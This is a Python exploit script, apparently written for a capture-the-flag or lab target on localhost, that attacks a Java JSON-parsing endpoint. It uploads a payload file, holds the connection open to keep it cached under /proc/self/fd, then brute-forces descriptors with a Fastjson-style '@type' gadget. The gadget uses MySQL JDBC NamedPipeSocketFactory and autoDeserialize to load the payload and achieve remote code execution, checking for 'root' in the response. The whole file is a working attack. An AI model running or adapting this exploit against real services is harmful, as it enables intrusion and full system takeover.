import socket
import threading
import time
import requests
import json

HOST = "127.0.0.1"
PORT = 8080


def cache_tmp():
    filepath = "./rce.txt"
    with open(filepath, "rb") as f:
        raw_data = f.read().strip()
    data_hex = raw_data.hex()
    a = data_hex
    a = b"""POST /json/parse HTTP/1.1
Host: 127.0.0.1:8080
Accept-Encoding: gzip, deflate
Accept: */*
Content-Type: multipart/form-data; boundary=xxxxxx
User-Agent: python-requests/2.32.3
Content-Length: 1296800

--xxxxxx
Content-Disposition: form-data; name="file"; filename="a.txt"

{{payload}}
""".replace(
        b"\n", b"\r\n"
    ).replace(
        b"{{payload}}", bytes.fromhex(a) + b"0" * 1024 * 11
    )
    s = socket.socket()
    s.connect((HOST, PORT))
    s.sendall(a)
    time.sleep(1111111)


def exp():
    url = f"http://{HOST}:{PORT}/json/parse"
    headers = {
        "Host": "127.0.0.1:8080",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "X-Authorization": "whoami",
        "Content-Type": "application/json",
    }
    for fd in range(20, 101):
        print(f"当前爆破到fd: {fd}")
        named_pipe_path = f"/proc/self/fd/{fd}"
        payload = {
            "@type": "java.lang.AutoCloseable",
            "@type": "com.mysql.cj.jdbc.ha.LoadBalancedMySQLConnection",
            "proxy": {
                "connectionString": {
                    "url": f"jdbc:mysql://xxx/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=mysql&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath={named_pipe_path}"
                }
            },
        }
        payload_json = json.dumps(payload).encode("utf-8")
        headers["Content-Length"] = str(len(payload_json))
        try:
            response = requests.post(url, headers=headers, data=payload_json, timeout=5)
            # 检查响应中是否包含"root"
            if "root" in response.text:
                print("\n========== 命中目标 ==========")
                print(f"请求体: {json.dumps(payload, indent=2)}")
                print(f"响应内容: {response.text}")
                print("==============================")
                # 终止爆破
                break
        except Exception:
            continue


threading.Thread(target=cache_tmp).start()
time.sleep(3)
exp()
